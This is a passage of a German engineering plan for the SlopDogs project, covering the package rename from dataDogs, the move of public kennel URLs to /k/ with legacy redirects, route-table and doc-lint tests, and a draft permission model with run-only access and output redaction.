    Get-ChildItem packages -Directory | ForEach-Object { Remove-Item -Recurse -Force (Join-Path $_.FullName 'dist'), (Join-Path $_.FullName 'node_modules/@datadogs') -ErrorAction SilentlyContinue }
                                                    # (bash: rm -rf node_modules/@datadogs packages/*/node_modules/@datadogs packages/*/dist dist ui-app/dist)
                                                    # dist enthaelt kompilierte require("@datadogs/core"); type-defs werden neu erzeugt
 5. Remove-Item package-lock.json                   # Root; ui-app/package-lock.json bleibt
    npm install                                     # schreibt package-lock neu, legt node_modules/@slopdogs/* als Symlinks an,
                                                    # postinstall: build:packages + 4x prisma generate + ui-app npm install (scripts/postinstall-run.cjs:4)
    Beweis: (Get-ChildItem node_modules/@slopdogs).Count  -> 54     (bash: ls node_modules/@slopdogs | wc -l)
            Select-String -Path package-lock.json -Pattern '@datadogs' | Measure-Object -> Count 0
 6. npm run typecheck                               # Beweis T2 kompiliert (core + dogs + tsconfig.build)
 7. npm run build ; npm run ui:build                # Serverbuild (scripts/run-build.cjs) + UI-Build ohne Budget-Fehler
 8. npm run check:integration-dogs
    npm start   (zweites Terminal, RUN_STARTUP_TESTS=1)  ->  npm run test:mcp:integration   # gegen LOKAL, nie Render
 9. git grep -n -i datadog -- ':!CHANGELOG.md'      # Residuen: nur die erlaubten Ausnahmen (Liste oben)
10. Freigabe 10-0 -> ein Commit "chore: rename dataDogs -> SlopDogs (scope @slopdogs, texts, protocol names with aliases)"
```

Merge-Regel: Dieser Commit landet **vor** jedem Feature-Commit; kein zweiter Branch darf offen sein, waehrend er entsteht. Wer nach P2 auf `develop` zurueckmergt, tut das mit diesem Commit voran.

**Randfaelle.** `dataDogId` (3 Seeds) bleibt (R6-Kontrolle). Generierte Prisma-Clients (`store/generated/*`, gitignored) tragen keinen Scope, nur absolute Pfade — `prisma generate` schreibt sie neu. `ui-app` hat 0 Scope-Referenzen; nur `index.html:5` (R8) und `kennel-list.component.ts:468` (R7) aendern sich dort. Der Realm-String in `ConfigRouteHandler.ts:23` steht in Backticks — R7 trifft ihn wie jeden String. `mcp/skill.md` ist die Quelle der Resource — nach R7 muss der Titel `# SlopDogs — MCP Skill` lauten (Kontrolle beim Lesen).

**Testfaelle.**

1. `testEnvAliasFallback` (StartupTest) — Given `SLOPDOGS_LOG_LEVEL` leer, `DATADOGS_LOG_LEVEL=verbose` in `process.env` gesetzt; When `isRuntimeLogVerbose()`; Then true und genau eine Alias-Logzeile. Given beide gesetzt; Then der neue Name gewinnt.
2. `testNegativeCacheMarkerAcceptsBothPrefixes` — Given zwei Cache-Payloads mit altem und neuem Praefix; When `PrismaCacheHandler` sie liest; Then beide werden als Negativ-Marker erkannt.
3. `mcp-gateway.integration.cjs` — `initialize`: Assert `si.name === 'slopdogs'` (:163 statt nur loggen); neu `resources/list`: Array enthaelt `slopdogs://skill` **und** `datadogs://skill`; `resources/read` beider URIs liefert denselben Text.

**Abnahmekriterien (messbar).** `Select-String '@datadogs' package-lock.json` = 0; `node_modules/@slopdogs` = 54 Eintraege; `git grep -i datadog -- ':!CHANGELOG.md'` = nur Ausnahmen; `npm run typecheck`, `npm run build`, `npm run ui:build`, `npm run check:integration-dogs` gruen; lokal `POST /mcp initialize` -> `serverInfo.name slopdogs`, `resources/list` = 2 Eintraege; `git grep -c peerDependencies -- 'packages/*/package.json'` = 0; `git status` nach Commit sauber.

**Commit-Schnitt.** Genau ein Commit (Schritt 10). Abhaengigkeit: P1 committed.

### P3 — `/k/` und das URL-Zielbild

**Ziel.** Der oeffentliche Kennel-Lauf zieht von `/:kennelId` nach `/k/:kennelId`; Swagger-UI und Spec ziehen von `/api/kennels/:id/docs|swagger.json` nach `/k/:id/docs|openapi.json`; alte Pfade antworten 308 ohne DB-Lookup; die Blockliste wird durch die Segment-Regel ersetzt; die SPA zieht auf `/kennels…`; `/` bekommt den Haken fuer die Landing (P5 liefert die Datei). Nach P2 heissen alle Pakete `@slopdogs/*` — die Pfade unten nutzen bereits diese Namen.

**Dateien.**

| Datei | Aenderung |
|---|---|
| `packages/core/src/kennelReservedNames.ts` -> `git mv` nach `packages/core/src/kennelPaths.ts`; `packages/core/src/index.ts:29-31` | Slug-Liste, `kennelLineageIdBlockedReason`, `kennelDisplayNameBlockedReason` loeschen. Neu exportieren: `KENNEL_PUBLIC_PREFIX`, `publicKennelPath`, `publicKennelDocsPath`, `publicKennelOpenApiPath`, `KENNEL_ID_PATTERN`, `kennelIdBlockedReason`. |
| `api/routes/spaRouteConstants.ts` | `KENNEL_LINEAGE_ID_BLOCKLIST`, `RESERVED_TOP_LEVEL_SEGMENTS`, Re-Exporte (:13-18) loeschen. Neu `FIXED_TOP_LEVEL` (2.5) und `SPA_FALLBACK_SKIP_PREFIXES` (:10) += `'/k'`. |
| `api/routes/KennelRunHandler.ts:62-71` | Routen: `app.head('/k/:kennelId', handlePublicHead)`, `app.get('/k/:kennelId', handlePublicGet)`, `app.post('/k/:kennelId', handlePublicPost)`; danach `app.all('/:name', legacyRedirect)` wenn `LEGACY_KENNEL_REDIRECT !== '0'`. `/api/kennels/:id/run|execute` unveraendert. |
| `api/routes/KennelRunHandler.ts:539-624` | Reserved-Check :541-544 und :587-590 loeschen. Nichtfund :549-556: immer `404 {error:'kennel_not_found'}` (kein `next()` mehr). Neu `handlePublicHead`. Neu `legacyRedirect`. |
| `api/routes/KennelSwaggerHandler.ts:24-25, :110` | Routen `/k/:id/openapi.json` und `/k/:id/docs`; `specUrl` = `publicKennelOpenApiPath(id) + versionSuffix`; alte Routen `/api/kennels/:id/swagger.json|docs` -> 308 auf die neuen (mit `req.originalUrl`-Query). |
| `services/swaggridAdapter.ts:21` + `packages/swaggrid/src/grimoire.ts:128-140, :243` | `SwaggridCast` bekommt `publicPath: string` (Adapter setzt `publicKennelPath(config.lineageId ?? config.id)`); `grimoire` nutzt `publicPath` statt `/${rift}` in Beschreibung (:140) und `paths` (:243). `rift` bleibt fuer Titel/Schemas. |
| `mcp/tools/kennels.ts:1121-1122` | `publicUrl: publicKennelPath(kennelId)`, neu `docsUrl`, `openapiUrl`; `runUrl` bleibt. Beschreibungstext `build_kennel` nennt `/k/`. |
| `api/KennelController.ts:75-80, :168, :373` | `kennelIdBlockedReason` statt der zwei Blocklisten-Funktionen; Namensregel nur fuer `input.id`; case-insensitive Eindeutigkeit bei `create` (2.6). |
| `api/routes/KennelBundleHandler.ts:204-209` | dito fuer den Import. |
| `server-app/heavyRequestLimiter.ts` | `PUBLIC_PATHS` auf `[/^\/k\/[^/]+\/?$/, /^\/k\/[^/]+\/openapi\.json\/?$/]` (P1-Liste loeschen). |
| `server-app/httpFrontEnd.builtUi.ts:8-12`, `httpFrontEnd.development.ts:6-10` | `beforeControllers`: `app.get('/')` und `app.get('/robots.txt')` -> `res.sendFile(path.join(ctx.publicDir, 'landing', 'index.html'|'robots.txt'))` **vor** `express.static`; dev liefert dieselben Dateien statt 302. `HttpFrontEndContext` (`httpFrontEndTypes.ts`) bekommt `publicDir`. Bis P5 die Datei liefert: existiert `public/landing/index.html` nicht, faellt `/` auf das heutige Verhalten zurueck (static index / 302). |
| `seed-data/kennels/compare.ts:26` | `const base = "http://localhost:3000/smart-guide?address="` ist ein absoluter Selbstaufruf, auf Render mit fremdem PORT tot (gefolgert). Umbau: `smart-guide` als Parent-Dog verdrahten statt HTTP-Selbstaufruf; falls das den Seed sprengt, minimal `"/k/smart-guide?address="` mit `PUBLIC_API_BASE_URL`-Praefix aus der VM-Umgebung — Entscheidung beim Bau, Kriterium: der Seed laeuft lokal durch. |
| `ui-app/src/app/config/kennel-reserved-names.ts` | loeschen. Neu `ui-app/src/app/config/public-paths.ts`: `KENNEL_PUBLIC_PREFIX = '/k'`, `publicKennelPath(id)`, `publicKennelDocsPath(id)`, `publicKennelOpenApiPath(id)`, `KENNEL_ID_PATTERN` (Handkopie mit Kommentar). |
| `ui-app/src/app/components/kennel-form/kennel-form.component.ts:153-162` | `KENNEL_ID_PATTERN.test(id)` statt Blockliste; Fehlertext "Kennel-ID: Buchstaben, Ziffern, Punkt, Bindestrich, Unterstrich, 1-64 Zeichen"; Namenspruefung (:159-162) entfaellt. |
| `ui-app/src/app/pages/kennel-config/kennel-config.component.ts:328` | Blocklisten-Aufruf entfernen (nur Anzeigename betroffen -> frei). |
| `ui-app/src/app/pages/kennel-list/kennel-list.component.ts:421, :455-456, :462, :466-468, :483-491, :574` | `listPublicExecutePath` -> `publicKennelPath(ref)` + defaultQuery; `share` teilt `apiAbsoluteUrl(listPublicExecutePath(kennel))` mit Text `"<title> – SlopDogs"`; `swagger`/`swaggerJson` -> `publicKennelDocsPath`/`publicKennelOpenApiPath`; Navigation `['/kennels', ref]`, `['/kennels', ref, 'edit']`. |
| `ui-app/src/app/services/kennel.service.ts:141` | `apiAbsoluteUrl(publicKennelPath(id))`. |
| `ui-app/src/app/pages/waves-viewer/waves-viewer.component.ts:239-262` | `swaggerDocsUrl`/`swaggerJsonUrl` -> `/k/…/docs|openapi.json`; `kennelRunBrowserUrl` -> `publicKennelPath`. |
| `ui-app/src/app/app.routes.ts` | Routen `kennels`, `kennels/:id`, `kennels/:id/edit`; `''` -> `redirectTo: 'kennels'`; `kennel` -> `kennels`, `kennel/:id` -> `kennels/:id`, `kennel/:id/edit` -> `kennels/:id/edit` (alle `redirectTo`, `pathMatch: 'full'`); Wildcard `**` -> `redirectTo: 'kennels'` (heute keine, "Cannot match any routes"). |
| `ui-app/src/app/pages/kennel-config/kennel-config.component.html:6, :160`; `pages/waves-viewer/components/waves-app-bar.component.html:2` | `routerLink` `['/kennels', kennelId]`; App-Bar-Zurueck `routerLink="/kennels"`. Der Link auf die Landing (`/`) ist im SPA ein plain `<a href="/">` (Vollseiten-Wechsel, kein routerLink — sonst faengt Angular ihn und leitet auf `/kennels`). |
| `ui-app/src/app/pages/kennel-list/kennel-list.component.ts` | `ActivatedRoute` injizieren; `queryParamMap`: `q` -> `searchQuery`/`appliedQuery` setzen und `reload()`; `new=1` -> `showCreateForm.set(true)` bzw. anonym `auth.login('/kennels?new=1')`. |
| `ui-app/proxy.conf.js:27-28` | `'/k'` als Proxy-Eintrag ergaenzen (Dev-Komfort; `execute()` nutzt ohnehin `apiAbsoluteUrl`). |
| Docs: `mcp/skill.md:98,481,681,731-732,871`; `AISkill.md:46,215,454-461`; `README.md:32,230,418,523,677`; `ARCHITECTURE.md:80,92,172,263,621`; `BACKLOG.md:9` (abhaken, Antwort: Ware unter `/k`, Steuer-API unter `/api`), `:19`, `:20`, `:91`; `.env.example:91-100` | Pfade, Regel, Weiche, `LEGACY_KENNEL_REDIRECT`. |
| `mcp/integration/mcp-gateway.integration.cjs` | Asserts unten. |
| `StartupTest.ts` | Tests unten. |

**Vertraege.**

```ts
// packages/core/src/kennelPaths.ts
export const KENNEL_PUBLIC_PREFIX = '/k';
export const KENNEL_ID_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/;
export function publicKennelPath(id: string): string;         // `/k/${encodeURIComponent(id)}`
export function publicKennelDocsPath(id: string): string;     // `/k/${enc}/docs`
export function publicKennelOpenApiPath(id: string): string;  // `/k/${enc}/openapi.json`
/** null = erlaubt; sonst der Grund (deutsch, fuer UI und API gleich). Lehnt leer, >64, '.', '..', '/' ab. */
export function kennelIdBlockedReason(id: string): string | null;
```

```ts
// api/routes/spaRouteConstants.ts
export const FIXED_TOP_LEVEL: ReadonlySet<string> = new Set(['api','auth','.well-known','static','mcp','actions','save','k','kennels','kennel','robots.txt']);
export const SPA_FALLBACK_SKIP_PREFIXES = ['/api', '/static', '/auth', '/mcp', '/actions', '/.well-known', '/k'] as const;
```

```ts
// api/routes/KennelRunHandler.ts — neue Handler
private async handlePublicHead(req, res): Promise<void>;
//   config = loadKennelConfig(kennelId, req.query.version); !config || !canRead -> 404 (leer); sonst 200, Cache-Control: no-store, kein Body, kein runKennel
private legacyRedirect(req, res, next): void;
//   name = req.params.name; if (FIXED_TOP_LEVEL.has(name.toLowerCase())) return next();
//   qs = req.originalUrl.includes('?') ? req.originalUrl.slice(req.originalUrl.indexOf('?')) : '';
//   res.redirect(308, publicKennelPath(name) + qs);        // kein DB-Lookup, keine Zaehlung
```

Env:

```
# LEGACY_KENNEL_REDIRECT — 1 (Default): alte Ein-Segment-Links /<name> antworten 308 -> /k/<name>. 0: aus (nach dem DB-Reset, wenn keine Alt-Links mehr im Umlauf sind).
```

Swagger-Spec danach: `paths: { '/k/<lineageId>': … }`, `servers: [{ url: '', description: 'SlopDogs-Server …' }]`. `build_kennel` antwortet:

```json
{ "kennelId": "wetter", "kennelLineageId": "wetter",
  "publicUrl": "/k/wetter", "docsUrl": "/k/wetter/docs", "openapiUrl": "/k/wetter/openapi.json",
  "runUrl": "/api/kennels/wetter/run", "dogs": [ … ] }
```

**Ablauf (ASCII).**

```
Alt-Link            Express                                   Antwort
GET /wetter?lat=1 -> static: kein Treffer
                  -> Routen 9-16: /k/:id? nein; /api…? nein
                  -> app.all('/:name'): 'wetter' nicht in FIXED_TOP_LEVEL
                     -> 308 Location: /k/wetter?lat=1          (0 DB-Roundtrips; heute: 1 Lookup je Fremdpfad, KennelRunHandler.ts:547)
GET /k/wetter?lat=1 -> Public-Bremse (4) -> handlePublicGet -> loadKennelConfig -> canRead -> runKennel -> sendResult (content-type-ehrlich)
GET /kennels      -> app.all('/:name'): 'kennels' fest -> next() -> SPA-Fallback -> index.html -> Angular 'kennels'
GET /k/nicht-da   -> handlePublicGet: 404 {error:'kennel_not_found'}   (SKIP_PREFIXES enthaelt /k: kein index.html)
HEAD /k/wetter    -> handlePublicHead: Lookup + canRead -> 200 leer      (kein Lauf, keine Zaehlung, nicht gebremst)
GET /api/kennels/wetter/docs?version=v1 -> 308 Location: /k/wetter/docs?version=v1
GET /wp-admin     -> 308 /k/wp-admin -> 404 JSON                          (zwei billige Antworten statt eines DB-Lookups)
```

**UI-Verhalten.** Klick "Antwort (Server)" oeffnet `/k/<id>?<panelQuery>&version=`; Swagger-Knopf oeffnet `/k/<id>/docs`; Teilen-Knopf uebergibt `{title, text: "<title> – SlopDogs", url: <origin>/k/<id>?<defaultQuery>}` an `navigator.share`, Rueckfall Zwischenablage (Logik :469-475 bleibt). Deep-Link `/kennels/wetter` rendert den Viewer; `/kennel/wetter` landet dort per Angular-Redirect (URL wechselt sichtbar). Kennel-Formular lehnt `a/b`, ` `, `..`, 65 Zeichen mit dem Regeltext ab. Optik unveraendert.

**Randfaelle.** Ein Kennel darf `k` heissen (`/k/k`, Boreal-Sonde ok). Ein Kennel `docs` lebt unter `/k/docs`, seine Doku unter `/k/docs/docs`. `mergeQueryParams` lowercased Werte (:90) — eine `channelId` mit Grossbuchstaben wird klein; vorbestehend, nicht Teil des Umzugs (Boreal Offene Sichten). Dokument-relative Pfade in Kennel-HTML loesen kuenftig unter `/k/` auf — fuer Kennel-zu-Kennel-Links (`other` -> `/k/other`) korrekt; root-absolute (`/api/channels`, `/static/…`, `/assets/…`) bleiben (Boreal 1.7; in Seeds kommt nichts Relatives vor). Trailing-Slash `/wetter/` matcht `/:name` mit `name="wetter"` und wird zu `/k/wetter` (Sonde). `POST /:name` mit Body: 308 traegt Methode und Body weiter (RFC 7538) — Clients, die 308 nicht folgen (curl ohne `-L`), bekommen den Redirect als Antwort; dogdoc und ki-fruechte werden in P6 umgestellt. Bot-Proben (`/wp-admin`, `/.env`) enden als 404 JSON unter `/k/…` — kein Lookup, kein Log-Rauschen. `/favicon.png` (nicht im Build) wird zu `/k/favicon.png` -> 404 statt heute index.html; harmlos.

**Testfaelle.**

1. `testKennelIdRule` — Given `kennelIdBlockedReason`; When `'wetter'`, `'Wetter-2024'`, `'k'`, `'a.b_c'`, 64 Zeichen; Then null. When `''`, `'a/b'`, `'.'`, `'..'`, `'a b'`, `'-lead'`, 65 Zeichen, `'a?b'`; Then Grund-String.
2. `testCreateRejectsCaseCollision` — Given Kennel `Wetter` existiert; When `create({id:'wetter'})`; Then `ok:false` mit Grund; When `create({id:'wetter2'})`; Then ok.
3. `testLegacyRedirectKeepsQueryAndMethod` — Given `KennelRunHandler` mit Fake-App (sammelt Routen); When `GET /wetter?lat=1&channelId=AbC`; Then 308, `Location` = `/k/wetter?lat=1&channelId=AbC` (unveraendert, Query nicht lowercased in der Weiche); When `POST /wetter`; Then 308 gleiche Location; When `GET /kennels`, `GET /api`, `GET /robots.txt`; Then `next()` aufgerufen, kein Redirect. Zaehler des Fake-Stores fuer `load`/`findByLineage` = 0.
4. `testPublicUnknownIs404` — Given Server lokal; When `GET /k/nicht-da`; Then 404 JSON, `Content-Type` application/json (kein HTML).
5. `testPublicHeadDoesNotRun` — Given Seed-Kennel und Fake-Counter (ab P4) bzw. Spy auf `runKennel`; When `HEAD /k/<seed>`; Then 200, leerer Body, `runKennel` nicht aufgerufen; When `HEAD /k/nicht-da`; Then 404.
6. `testSwaggerRedirectAndPaths` — When `GET /api/kennels/<seed>/docs?version=x`; Then 308 `/k/<seed>/docs?version=x`. When `GET /k/<seed>/openapi.json`; Then 200 und `Object.keys(spec.paths)[0] === '/k/<seed>'`; `spec.servers[0].url === ''`.
7. `mcp-gateway.integration.cjs` — nach `build_kennel` (oder `get_kennel`-Beispiel): `publicUrl.startsWith('/k/')`, `docsUrl.endsWith('/docs')`, `openapiUrl.endsWith('/openapi.json')`.
8. Manueller Klicktest (Angular hat `skipTests`, `angular.json:31-33`): Liste -> Play oeffnet `/k/…`; Swagger -> `/k/…/docs`; Teilen kopiert `/k/…?…`; `/kennel/<id>` leitet auf `/kennels/<id>`; `/kennels?q=wett` zeigt gefilterte Liste; `/kennels?new=1` oeffnet das Formular; Formular lehnt `a/b` ab.

**Abnahmekriterien (messbar).** `grep -n '/:kennelId' README.md ARCHITECTURE.md AISkill.md mcp/skill.md` = 0; `git grep -n "KENNEL_RESERVED_SLUGS\|kennelLineageIdBlockedReason\|kennelDisplayNameBlockedReason"` = 0; `git grep -n "'/kennel'" ui-app/src` = 0; Tests 1-7 gruen; `npm run ui:build` ohne Budget-Fehler; mit `DEBUG=prisma:query`: `GET /wp-admin` erzeugt keine Query; `curl -sI http://127.0.0.1:3000/wetter?lat=1` zeigt `HTTP/1.1 308` und `Location: /k/wetter?lat=1`.

**Commit-Schnitt (jeder typecheck-gruen).**

1. `feat(core): kennelPaths — Praefix /k, Segment-Regel, Blockliste weg` — core, spaRouteConstants, KennelController, BundleHandler, UI-Config + Form; Tests 1-2.
2. `feat(api): /k/:id mit HEAD, 404 statt SPA-Fallback, Alt-Weiche 308 ohne DB` — KennelRunHandler, Public-Bremse-Regex, SKIP_PREFIXES; Tests 3-5.
3. `feat(api): Swagger-UI und Spec unter /k/:id/docs|openapi.json, 308 von /api` — SwaggerHandler, swaggridAdapter, grimoire, kennels.ts publicUrl/docsUrl/openapiUrl; Tests 6-7.
4. `feat(ui): Buehne unter /kennels, Public-Links auf /k, Teilen teilt die Public-Seite, q/new aus der URL` — app.routes, kennel-list, kennel.service, waves-viewer, kennel-config, app-bar, proxy.conf; Klicktest 8.
5. `feat(server): Haken fuer statische Landing an / und /robots.txt` — builtUi, development, httpFrontEndTypes (Datei kommt in P5; ohne Datei Rueckfall).
6. `fix(seed): compare-Kennel ohne localhost-Selbstaufruf` — compare.ts.
7. `docs(mcp): Texte fuer P3` — alle P3-Zeilen aus 4.0 (README, ARCHITECTURE, AISkill, skill.md, BACKLOG, .env.example, kennels.ts/snapshots.ts-Beschreibungen ueber die Pfad-Konstante).
8. `test(routes): Routentabelle als Code, Doc-Lint, Gateway-Asserts` — siehe 3.9.

#### 3.9 Routentabelle als Code, Doc-Lint, Gateway-Asserts (Boreal B.2 — "der Test ist die eigentliche Lieferung")

1. **Routentabelle als Code:** `api/routes/routeTable.ts` exportiert
   ```ts
   export const PUBLIC_ROUTES = ['/k/:id', '/k/:id/docs', '/k/:id/openapi.json'] as const;
   export const SPA_ROUTES    = ['/kennels', '/kennels/:id', '/kennels/:id/edit', '/dogs', '/account', '/login'] as const;   // /dogs, /account, /login ab P6; kein /dogs/:id (8.21)
   export const API_ROUTES    = [ … jede /api-Route aus 2.2, inkl. der Phasen P3.5-P4c, in der Phase ergaenzt … ] as const;
   export const LEGACY_308    = ['/api/kennels/:id/docs', '/api/kennels/:id/swagger.json', '/:name'] as const;
   ```
   `KennelRunHandler`, `KennelSwaggerHandler`, `spaRouteConstants` und `app.routes.ts` (Handkopie mit Kommentar) registrieren **aus** dieser Tabelle. StartupTest `testRouteTableMatchesExpressStack`: liest den Express-Stack (Express 5: `app.router.stack`) und prueft, dass jeder Tabelleneintrag als Route vorkommt und jede registrierte Nicht-Middleware-Route in der Tabelle steht (Diff in beide Richtungen ist ein Fehler).
2. **Doc-Lint** `scripts/check-doc-paths.cjs`, Skript `npm run lint:docs`, in `npm test` (`package.json:97`) eingehaengt: extrahiert aus `mcp/skill.md`, `README.md`, `AISkill.md`, `ARCHITECTURE.md`, `.cursor/skills/*/SKILL.md`, `mcp/tools/*.ts` (description-Strings), `mcp/spuren-brief.ts`, `mcp/werkzeugkasten.ts` alle Pfad-Tokens per Regex `(^|[\s\`(])/(k|api|kennels|dogs|account|auth|actions|mcp|static|\.well-known)(/[A-Za-z0-9:._<>{}-]+)*` und prueft jeden gegen die Routentabelle mit Platzhalter-Normalisierung (`:id`, `<id>`, `<kennel-id>`, `<kennelId>`, `{id}` -> `:id`); Treffer ohne Tabelleneintrag = Fehler mit Datei:Zeile. Negativliste (Fehler, ausser in einer Zeile, die `308` oder `legacy` enthaelt): `/:kennelId`, `/api/kennels/:id/docs`, `/api/kennels/:id/swagger.json`, `datadogs://`, `DATADOGS_`, `dataDogs`, `localhost:4300/kennel/`, `/kennel/`. Zusaetzlich zaehlt das Skript die Backtick-Toolnamen in `skill.md:75-87` und vergleicht sie mit den Namen aus `mcp/tools/*.ts` (`name:`-Felder): Menge und Anzahl muessen stimmen; die Zahl in `skill.md:73` ("47 tools") wird gegen diese Anzahl geprueft oder entfernt.
3. **Gateway-Test** (`mcp-gateway.integration.cjs`) erweitern: `initialize` -> `serverInfo.name === 'slopdogs'`, `instructions` enthaelt `slopdogs://skill`; `resources/list` enthaelt `slopdogs://skill`; `resources/read` liefert Text ohne Negativmuster (derselbe Regex wie 2.); `tools/list`-Namen ⊇ REQUIRED_TOOLS; `build_kennel`-Antwort: `publicUrl` `^/k/`, `docsUrl` `/docs$`, `openapiUrl` `/openapi.json$`; ab P4: `describe_tool('list_kennels').inputSchema.properties.sort.enum` enthaelt `rating`; ab P4b: `describe_tool('list_nodes')…sort.enum` enthaelt `proven`.

Abnahme 3.9: `npm test` laeuft `lint:docs` mit und ist gruen; `testRouteTableMatchesExpressStack` gruen; Gateway-Asserts gruen lokal.

**Editor-Route in P3 (Lotus: Editor-Seite faellt).** `/kennels/:id/edit` bleibt Route und rendert in P3 noch `KennelConfigComponent` (minimal umbenannt). Der Umbau zum Drawer ueber der Kennel-Seite ist P6 U6; P3 investiert nichts mehr in `kennel-config` ausser den Pfad-Aenderungen.

Abhaengigkeiten: 2 braucht 1; 3 braucht 1; 4 braucht 2+3; 5 unabhaengig; 6 braucht 2; 7 nach 1-6; 8 nach 7 (Lint muss gruen sein, wenn er scharf geht). P3.5 setzt 2 voraus; P4 setzt 2 voraus (Zaehlpunkt haengt am Handler, aber Test 11.7 in P4 braucht die Weiche).

### P3.5 — Rechte v2: NONE < RUN < READ < EDIT < OWN

Quelle: Nira `nira_slopdogs_rechte.md` (vollstaendig eingearbeitet). Lotus: vor P4, weil Stats, Ratings und Keys an `canRead` haengen; erst wenn RUN von READ getrennt ist, koennen Stats "wer hat ausgefuehrt" von "wer darf lesen" unterscheiden, Ratings an RUN haengen (W21) und der Key-Store die Regel "keine Keys fuer Dogs unterhalb READ" formulieren (Nira 6). Niras Commit 2 (F1-F5) ist P1 Commit 4/5; Niras Commit 5 (UI) ist P6 U6.

#### 3.5.1 Ist-Stand (Nira 1, geprueft)

- Spalten (`store/prisma/schema.prisma:31-36`, eine `Dog`-Tabelle fuer Kennels und Nodes): `visibility String?` ("public"|"private"|null), `ownerId String?` (null = community), `editors String?` (CSV), `viewers String?` (CSV). Kein `runners`, keine Stufe "ausfuehren ohne lesen".
- `effectiveVisibility` `mcp/auth/visibility.ts:42-54`: explizit public/private; null -> community (ownerId null) = public, sonst private (fail-closed seit 09-13). `canRead` :62-75: superuser immer; public jeder; privat owner/editors/viewers; community jeder Eingeloggte. **canRead = RUN = READ = COPY** — eine Stufe fuer alles. `canMutate` :82-91; `canMutateNode` (`permissions.ts:30-36`) = canMutate, Kennel-Owner-Bypass am 09-13 entfernt. ACL-Verwaltung nur MCP (`mcp/tools/acl.ts`, :63-69) — kein REST-Pfad.
- Superuser: `middleware.ts:35-39` `MCP_AUTH_REQUIRED !== 'true'` -> jeder Request `{user:null, isSuperUser:true}` -> alle Gates offen (canRead :63, canMutate :83, redact :270, `firstUnreferenceableDog` `kennels.ts:209`). Nicht fail-closed; kein Startup-Guard fuer prod.
- F7: Es gibt keine RUN-Stufe.

#### 3.5.2 Rechtematrix (Entwurf, woertlich)

Stufen streng geordnet: **NONE < RUN < READ < EDIT < OWN**. COPY = READ (W16).

| Recht | bedeutet |
|---|---|
| RUN | Kennel ausfuehren / Dog als Parent nutzen; Lead-Result bzw. Dog-Output sehen; kein Code, keine Config/Defaults/Task/Nodes/Versionen |
| READ | + Code, Config, defaults, task, layout, Versionen, Export/Bundle, Fork, get_node(_lines/_versions), Snapshot-Code/vmContext |
| EDIT | + neue Version, rename, delete, dogIds aendern |
| OWN | + Rechte verwalten (ACL), visibility, Owner-Transfer |

Rollen -> Stufe (Kennel wie Dog):

| Rolle | privat | run-only (neu) | public |
|---|---|---|---|
| anonym | NONE | RUN | READ |
| eingeloggt, nicht gelistet | NONE | RUN | READ |
| runners[] (neu) | RUN | RUN | READ |
| viewers[] (UI: reader) | READ | READ | READ |
| editors[] | EDIT | EDIT | EDIT |
| owner | OWN | OWN | OWN |
| Agent mit PAT | wie der PAT-User | | |
| community (ownerId null) | heute READ+EDIT fuer Eingeloggte -> Entscheidung 8.16 (Empfehlung: einfrieren auf READ, EDIT nur Superuser) | | |
| Superuser | alles — nur wenn `MCP_AUTH_REQUIRED` nicht `true` **und** `NODE_ENV` nicht production/integration; sonst Start verweigern (Lotus) | | |

Praedikate: `canRun(e, ctx)` (neu, ⊇ canRead), `canRead` (bestehend, um `runners` **nicht** erweitert — Stats/Ratings/Keys bauen darauf auf), `canMutate`, `canManageAcl` (Owner, Superuser, Community-Regel nach 8.16). Referenzieren eines Dogs in einem Kennel = `canRun` (heute canRead, `kennels.ts:204-218`, `ConfigRouteHandler.ts:97-109`).

#### 3.5.3 Schema (woertlich, beide Dateien, beide Entitaeten, additiv)

```prisma
  visibility  String?   // "public" | "run-only" | "private"   (neu: run-only)
  runners     String?   // CSV User.id — duerfen ausfuehren/referenzieren, nicht lesen (neu)
  frozen      Boolean   @default(false)   // 8.16: Owner (bei Community der Superuser) friert ein; EDIT fuer alle gesperrt, RUN/READ/Export unveraendert (8.25)
```

`frozen` (8.16, Lotus: gehoert zu P3.5): `canMutate` liefert `false`, wenn `frozen` — auch fuer den Owner; nur `freeze`/`unfreeze` selbst bleibt dem Owner (Superuser bei Community) erlaubt (`canManageAcl`). REST: `POST /api/:sub/:id/freeze`, `POST /api/:sub/:id/unfreeze` (3.5.6); MCP: `freeze_entity`/`unfreeze_entity` in `acl.ts`; `myRights` bekommt `frozen: boolean`. Laeufe, Sterne, Kopien (Export/Import) laufen weiter (Empfehlung 8.25). Die Kopfversion traegt das Feld; eine neue Version entsteht bei frozen nicht (der Save ist gesperrt). Kein Rollenfeld je User — drei Listen plus owner bilden die Rollen ab. Default je Erstellung bleibt `private` (`applyCreateDefaults` `visibility.ts:97-106`); Superuser-Default `public` -> `private` drehen.

#### 3.5.4 Fremder run-only-Dog im eigenen Kennel (Entscheidung 8.15, Empfehlung B+C) und Redaction-Modus

Optionen (Nira 3): A verbieten (Referenz braucht READ) — einfach, aber "bewaehrt" (P4b) stirbt; B erlauben, Referenz braucht RUN — mein Code sieht `Parent.collected` (Output) im vmContext, nie `theRun`; C erlauben + pinnen — Referenz auf Version-GUID statt lineageId, damit der Autor spaeter keinen Code unterschieben kann, der in meinem Kontext laeuft. Empfehlung **B + C**: Referenz auf run-only-Fremddogs nur als Version-Pin, UI bietet "auf neue Version heben". Nebenwirkungen ehrlich: (1) der Fremd-Dog laeuft mit **meinem** Capability-Kontext (jsonStore `user:<ich>:`, spaeter Keys) — deshalb `keys`-Capability fuer Dogs, die der Runner nicht READ-en darf, **nicht** bereitstellen (P4c 4c.4 Schritt 1 bekommt diese Pruefung) und jsonStore fuer solche Dogs auf `user:<ich>:dog:<lineage>:` beschraenken; (2) Output ist per Definition sichtbar — was der run-only-Dog liefert, verantwortet sein Autor.

Redaction-Modus (`services/wavesRedaction.ts` aus P1, `redactWavesForCtx(waves, ctx, kennelLevel)`), zwei Stufen (W17):

| Stufe | Wann | Was bleibt | Was faellt |
|---|---|---|---|
| Kennel-RUN | `canRun(kennel)` aber `!canRead(kennel)` | `{ ok, waves: [{ dogCount }], leadResult, durationMs, dogs: [{ status: 'ok'\|'failed'\|'cached' }] }` — Struktur, Lead-Result, Status | jede Identitaet (id, name, icon, lineageId), Code, Kontext, Ergebnis je Dog, Fehlertexte (nur `[redacted]`) |
| Dog-RUN in Kennel-READ | `canRead(kennel)`, je Dog `canRun(dog) && !canRead(dog)` | id, lineageId, displayName, icon, `result`, `error` (gekuerzt, W13) | codeTs, vmContext, typedef, serializedDogConfig, lineDocs |
| READ | `canRead(dog)` | alles | — |
